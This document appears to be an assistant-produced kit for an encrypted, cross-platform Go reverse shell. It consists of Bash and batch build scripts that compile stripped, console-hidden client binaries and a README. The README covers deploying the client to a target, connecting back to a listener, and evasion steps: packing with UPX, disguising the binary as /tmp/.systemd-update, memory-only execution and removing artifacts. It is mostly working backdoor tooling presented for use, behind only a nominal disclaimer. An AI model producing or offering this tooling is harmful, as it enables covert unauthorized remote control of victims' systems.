
**build.sh:**

```bash
#!/bin/bash

set -e

echo "================================"
echo "   Reverse Shell Build System"
echo "================================"
echo ""

CLIENT="nice__.go"
LISTENER="nice_listen_.go"
OUTPUT_DIR="bin"

# Create output directory
mkdir -p $OUTPUT_DIR

echo "[*] Building listener..."
go build -ldflags "-s -w" -o $OUTPUT_DIR/listener $LISTENER
echo "    ✓ listener -> $OUTPUT_DIR/listener"

echo ""
echo "[*] Building clients for multiple platforms..."

# Linux AMD64
echo "    → Linux (amd64)"
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-linux-amd64 $CLIENT

# Linux ARM
echo "    → Linux (arm)"
GOOS=linux GOARCH=arm GOARM=7 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-linux-arm $CLIENT

# Linux ARM64
echo "    → Linux (arm64)"
GOOS=linux GOARCH=arm64 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-linux-arm64 $CLIENT

# Windows AMD64
echo "    → Windows (amd64)"
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" \
    -o $OUTPUT_DIR/client-windows-amd64.exe $CLIENT

# Windows 386
echo "    → Windows (386)"
GOOS=windows GOARCH=386 go build -ldflags "-H=windowsgui -s -w" \
    -o $OUTPUT_DIR/client-windows-386.exe $CLIENT

# macOS AMD64
echo "    → macOS (amd64)"
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-macos-amd64 $CLIENT

# macOS ARM64 (M1/M2)
echo "    → macOS (arm64)"
GOOS=darwin GOARCH=arm64 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-macos-arm64 $CLIENT

# FreeBSD
echo "    → FreeBSD (amd64)"
GOOS=freebsd GOARCH=amd64 go build -ldflags "-s -w" \
    -o $OUTPUT_DIR/client-freebsd-amd64 $CLIENT

echo ""
echo "[✓] Build complete! Binaries in $OUTPUT_DIR/"
echo ""
ls -lh $OUTPUT_DIR/
```

**build.bat** (for Windows):

```batch
@echo off
setlocal enabledelayedexpansion

echo ================================
echo    Reverse Shell Build System
echo ================================
echo.

set CLIENT=nice__.go
set LISTENER=nice_listen_.go
set OUTPUT_DIR=bin

if not exist %OUTPUT_DIR% mkdir %OUTPUT_DIR%

echo [*] Building listener...
go build -ldflags "-s -w" -o %OUTPUT_DIR%\listener.exe %LISTENER%
echo     √ listener -^> %OUTPUT_DIR%\listener.exe
echo.

echo [*] Building clients for multiple platforms...

echo     -^> Linux (amd64)
set GOOS=linux
set GOARCH=amd64
go build -ldflags "-s -w" -o %OUTPUT_DIR%\client-linux-amd64 %CLIENT%

echo     -^> Windows (amd64)
set GOOS=windows
set GOARCH=amd64
go build -ldflags "-H=windowsgui -s -w" -o %OUTPUT_DIR%\client-windows-amd64.exe %CLIENT%

echo     -^> macOS (amd64)
set GOOS=darwin
set GOARCH=amd64
go build -ldflags "-s -w" -o %OUTPUT_DIR%\client-macos-amd64 %CLIENT%

echo.
echo [√] Build complete! Binaries in %OUTPUT_DIR%\
echo.
dir %OUTPUT_DIR%
```

**README.md:**

```markdown
# Encrypted Reverse Shell

A cross-platform, encrypted reverse shell implementation in Go with automatic
reconnection and stealth features.

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.**

Unauthorized access to computer systems is illegal. Only use this tool on
systems you own or have explicit written permission to test. The authors assume
no liability for misuse.

## Features

- **AES-256-GCM Encryption** - All traffic encrypted end-to-end
- **Auto-Reconnection** - Client automatically reconnects on disconnect
- **Cross-Platform** - Works on Linux, Windows, macOS, BSD
- **Stealth Mode** - Hidden console on Windows, stripped binaries
- **Shell Detection** - Automatically uses appropriate shell per OS

## Technical Architecture

### Encryption

The shell uses AES-256 in GCM (Galois/Counter Mode) for authenticated
encryption:

- Key derivation: SHA-256 hash of shared secret
- Nonce: 12 bytes (GCM standard), randomly generated per message
- Authentication: Built-in AEAD (Authenticated Encryption with Associated Data)

**Message Format:**
```
[4 bytes: length][nonce + ciphertext]
```

### Connection Flow

```
Client                          Listener
  |                                |
  |--- TCP Connect (encrypted) --->|
  |                                |
  |<-- AES-GCM encrypted shell --->|
  |                                |
  |-- Disconnect (auto-retry) -----|
  |                                |
  |--- Reconnect after 5s -------->|
```

### Platform-Specific Shells

- **Windows**: `cmd.exe`
- **Unix/Linux**: `$SHELL` (fallback: `/bin/sh`)
- **macOS**: `$SHELL` (typically `/bin/zsh`)

## Building

### Prerequisites

- Go 1.16+ installed
- Make (optional)

### Quick Build

**Linux/macOS:**
```bash
chmod +x build.sh
./build.sh
```

**Windows:**
```batch
build.bat
```

### Manual Build

**Listener:**
```bash
go build -ldflags "-s -w" -o listener nice_listen_.go
```

**Client (current platform):**
```bash
go build -ldflags "-s -w" -o client nice__.go
```

**Client (cross-compile):**
```bash
# Linux
GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o client-linux nice__.go

# Windows (with hidden console)
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" \
    -o client.exe nice__.go

# macOS
GOOS=darwin GOARCH=amd64 go build -ldflags "-s -w" -o client-mac nice__.go
```

### Build Flags Explained

- `-s`: Strip symbol table
- `-w`: Strip DWARF debugging information
- `-H=windowsgui`: Hide console window on Windows

## Configuration

Edit constants in `nice__.go` before building:

```go
const (
    host       = "127.0.0.1"              // Listener IP
    port       = "4444"                   // Listener port
    key        = "your-secret-key-32chr!" // Must be same in both files
    maxRetries = -1                       // -1 for infinite
    retryDelay = 5 * time.Second          // Delay between reconnects
)
```

**⚠️ IMPORTANT:** Change the `key` constant before deploying!

## Usage

### 1. Start the Listener

```bash
./bin/listener
```

Output:
```
[*] Listening on :4444
```

### 2. Deploy the Client

Transfer the appropriate client binary to the target system and execute:

```bash
# Linux/macOS
./client-linux-amd64

# Windows
client-windows-amd64.exe
```

### 3. Interact with Shell

Once connected, you'll see:
```
[+] Connection from 192.168.1.100:54321
```

You can now execute commands. The shell will auto-reconnect if disconnected.

### Example Session

```bash
$ ./bin/listener
[*] Listening on :4444
[+] Connection from 192.168.1.50:49302

whoami
alice

uname -a
Linux target 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux

pwd
/home/alice
```

## Security Considerations

### Strengths

- ✅ End-to-end AES-256-GCM encryption
- ✅ No plaintext shell traffic
- ✅ Authenticated encryption (prevents tampering)
- ✅ Per-message nonces (prevents replay attacks)

### Limitations

- ⚠️ Static shared key (key exchange not implemented)
- ⚠️ No certificate validation
- ⚠️ No obfuscation of network patterns
- ⚠️ Detectable by behavioral analysis

### Detection Vectors

1. **Network**: Unusual outbound connections to single host/port
2. **Process**: Unknown binaries spawning shells
3. **Behavioral**: Persistent reconnection attempts
4. **Forensic**: Binary artifacts on disk

## Evasion Techniques (Educational)

### Network Level

```go
// Add jitter to reconnection timing
retryDelay = time.Duration(5+rand.Intn(10)) * time.Second

// Use common ports (80, 443, 8080)
port = "443"
```

### Binary Level

```bash
# Further reduce binary size with UPX
upx --best --lzma client-linux-amd64

# Change binary name to something innocuous
mv client-linux-amd64 /tmp/.systemd-update
```

### Operational Security

- Use HTTPS reverse proxy (Nginx/Caddy) in front of listener
- Deploy via memory-only execution (no disk writes)
- Clean up artifacts after use

## Troubleshooting

### Connection Refused

- Check firewall rules: `sudo ufw allow 4444/tcp`
- Verify listener is running: `netstat -tulpn | grep 4444`
- Confirm network connectivity: `nc -zv <listener-ip> 4444`

### Encryption Errors

- Ensure `key` constant matches in both files
- Verify Go crypto library is available
- Check for network corruption (unlikely with TCP)

### Shell Not Working

- Verify shell exists on target: `which sh` or `where cmd`
- Check permissions: `chmod +x client-linux-amd64`
- Review stderr output (if running interactively)

## Development

### Project Structure

```
.
├── nice__.go           # Client implementation
├── nice_listen_.go     # Listener implementation
├── build.sh            # Unix build script
├── build.bat           # Windows build script
├── README.md           # This file
└── bin/                # Compiled binaries
    ├── listener
    ├── client-linux-amd64
    ├── client-windows-amd64.exe
    └── ...
```

### Testing

```bash
# Terminal 1: Start listener
./bin/listener

# Terminal 2: Run client locally
./bin/client-linux-amd64

# Terminal 1: Execute commands
whoami
pwd
exit
```

### Adding Features

**Example: Add password authentication**

```go
// In client (nice__.go)
func authenticate(conn net.Conn) error {
    password := "hunter2"
    _, err := conn.Write([]byte(password + "\n"))
    return err
}

// In listener (nice_listen_.go)
func checkAuth(conn net.Conn) bool {
    buf := make([]byte, 256)
    n, _ := conn.Read(buf)
    return strings.TrimSpace(string(buf[:n])) == "hunter2"
}
```

## References

- [AES-GCM Specification](https://tools.ietf.org/html/rfc5116)
- [Go crypto/cipher Package](https://pkg.go.dev/crypto/cipher)
- [Cross-Compilation in Go](https://go.dev/doc/install/source#environment)

## License

MIT License - See LICENSE file for details

Use responsibly and legally.

---

**Version:** 1.0.0  
**Author:** Security Research  
**Last Updated:** 2026-02-12
```

Make the build script executable:

```bash
chmod +x build.sh
```

Then run:

```bash
./build.sh
```

##
##
